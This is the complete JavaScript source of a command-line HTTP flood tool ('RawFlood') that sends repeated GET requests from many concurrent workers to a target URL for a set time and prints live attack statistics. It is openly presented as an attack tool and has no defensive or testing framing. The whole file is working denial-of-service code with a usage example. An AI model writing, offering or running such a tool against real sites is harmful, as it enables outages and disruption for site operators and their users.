const http = require('http');
const https = require('https');
const url = require('url');
const readline = require('readline');

class RawFlood {
    constructor() {
        this.stats = {
            requests: 0,
            errors: 0,
            success: 0
        };
        this.startTime = Date.now();
        this.isRunning = false;
        this.workers = [];
    }

    async floodTarget(target, time, rate, threads) {
        this.isRunning = true;
        const parsedUrl = url.parse(target);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        const duration = parseInt(time) * 1000;
        const endTime = Date.now() + duration;
        
        console.log(`🚀 Starting Raw Flood Attack`);
        console.log(`🎯 Target: ${target}`);
        console.log(`⏱️ Time: ${time}s`);
        console.log(`⚡ Rate: ${rate}ms`);
        console.log(`🧵 Threads: ${threads}`);
        console.log(`💥 Mode: Raw Flood (No Bypass)`);
        console.log(`⏹️ Type '/stop' to cancel attack\n`);

        this.setupStopListener();

        for (let i = 0; i < threads; i++) {
            this.workers.push(this.createWorker(protocol, parsedUrl, rate, endTime, i));
        }

        const statsInterval = setInterval(() => {
            this.displayStats();
            if (Date.now() >= endTime || !this.isRunning) {
                clearInterval(statsInterval);
                this.cleanup();
                console.log('\n✅ Attack completed!');
                process.exit(0);
            }
        }, 2000);

        await Promise.all(this.workers);
    }

    setupStopListener() {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        rl.on('line', (input) => {
            if (input.trim().toLowerCase() === '/stop') {
                console.log('\n🛑 Stopping attack...');
                this.stop();
                rl.close();
            }
        });
    }

    createWorker(protocol, target, rate, endTime, workerId) {
        return new Promise((resolve) => {
            const worker = async () => {
                while (Date.now() < endTime && this.isRunning) {
                    try {
                        await this.makeRawRequest(protocol, target);
                        await new Promise(r => setTimeout(r, rate));
                    } catch (error) {
                        this.stats.errors++;
                    }
                }
                resolve();
            };
            worker();
        });
    }

    makeRawRequest(protocol, target) {
        return new Promise((resolve) => {
            const options = {
                hostname: target.hostname,
                port: target.port || (target.protocol === 'https:' ? 443 : 80),
                path: target.path || '/',
                method: 'GET',
                timeout: 5000,
                rejectUnauthorized: false
            };

            const req = protocol.request(options, (res) => {
                this.stats.requests++;
                if (res.statusCode === 200) {
                    this.stats.success++;
                }
                res.on('data', () => {});
                res.on('end', () => resolve());
            });

            req.on('error', () => {
                this.stats.errors++;
                resolve();
            });

            req.on('timeout', () => {
                this.stats.errors++;
                req.destroy();
                resolve();
            });

            req.end();
        });
    }

    displayStats() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const rps = runtime > 0 ? (this.stats.requests / runtime).toFixed(2) : '0';
        
        console.log(`📊 Requests: ${this.stats.requests} | ✅ Success: ${this.stats.success} | ❌ Errors: ${this.stats.errors} | ⚡ RPS: ${rps}`);
    }

    stop() {
        this.isRunning = false;
        this.cleanup();
        this.displayStats();
        console.log('\n🛑 Attack stopped by user command /stop');
        process.exit(0);
    }

    cleanup() {
        this.workers = [];
    }
}

if (require.main === module) {
    const args = process.argv.slice(2);
    
    if (args.length === 4) {
        const [target, time, rate, thread] = args;
        
        if (!target.startsWith('http')) {
            console.log('❌ Invalid target URL. Must start with http:// or https://');
            process.exit(1);
        }

        const flood = new RawFlood();
        flood.floodTarget(target, parseInt(time), parseInt(rate), parseInt(thread));
    } else {
        console.log('Usage: node rawflood.js <target> <time> <rate> <threads>');
        console.log('Example: node rawflood.js https://example.com/ 60 10 50');
        console.log('Commands: Type "/stop" during attack to cancel');
        process.exit(1);
    }
}

module.exports = RawFlood;module.exports = RawFlood;
